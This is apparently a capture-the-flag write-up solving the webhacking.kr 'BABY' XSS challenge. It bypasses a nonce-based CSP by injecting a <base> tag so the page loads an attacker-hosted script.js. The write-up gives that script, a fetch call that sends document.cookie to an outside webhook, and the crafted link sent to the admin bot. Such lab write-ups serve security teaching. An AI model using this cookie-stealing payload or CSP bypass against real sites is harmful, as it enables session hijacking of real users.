# BABY    XSS (Base)

URL: [http://webhacking.kr:10010/?inject=foo](http://webhacking.kr:10010/?inject=foo)

![baby.png](/assets/ctf/webhacking.kr/baby.png)

```powershell
➜ curl -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' "http://webhacking.kr:10010/?inject=foo" -i
HTTP/1.1 200 OK
Date: Mon, 19 Aug 2024 16:44:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Security-Policy: script-src 'nonce-1RBeY+47Z3ak68nHTPcL0SxVYYc=';
Vary: Accept-Encoding
Content-Length: 145
Content-Type: text/html; charset=UTF-8

<h2>you can inject anything</h2>
<div id=injected>
foo
</div>
<script src=/script.js nonce=1RBeY+47Z3ak68nHTPcL0SxVYYc=></script>
```

While we can inject anything we can't execute anything due to CSP policy...

```bash
Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'nonce-ecAUJY39iD/ktq3MkULVqlHGVtk='". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present.
```

There's a report form which sends the URL to admin, meaning we have to steal their cookies somehow.

![baby-1.png](/assets/ctf/webhacking.kr/baby-1.png)

[base](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base) tag: _The **`<base>`** [HTML](https://developer.mozilla.org/en-US/docs/Web/HTML) element specifies the base URL to use for all relative URLs in a document. There can be only one `<base>` element in a document._ 

![baby-2.png](/assets/ctf/webhacking.kr/baby-2.png)

We can take advantage of `base` tag to include the malicious JS hosted on our machine.

Create script like
```js
fetch('https://uwuos.free.beeceptor.com/?c='+document.cookie)
```

Setup python server, then attach ngrok to that http port, Craft malicious link [http://webhacking.kr:10010/?inject=<base%20href="https://e6ff-188-169-37-20.ngrok-free.app"%20/>](http://webhacking.kr:10010/?inject=<base%20href="https://e6ff-188-169-37-20.ngrok-free.app"%20/>), send to admin

![baby-3.png](/assets/ctf/webhacking.kr/baby-3.png)

Receive the flag on desired webhook server 

![baby-4.png](/assets/ctf/webhacking.kr/baby-4.png)